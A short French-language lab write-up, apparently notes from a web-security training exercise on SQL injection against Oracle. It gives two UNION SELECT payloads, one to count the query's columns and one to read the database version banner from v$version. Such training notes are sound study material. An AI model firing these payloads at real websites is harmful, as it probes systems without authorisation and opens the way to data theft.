# __SQL injection attack, querying the database type and version on Oracle__

[SQL injection attack, querying the database type and version on Oracle](https://0a5300fc04e38cac80c608e400050047.web-security-academy.net/)

On teste ca pour regarder combien on a de colonne :

'+UNION+SELECT+'abc','def'+FROM+dual—

Et ca pour la version (juste pour oracle)

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
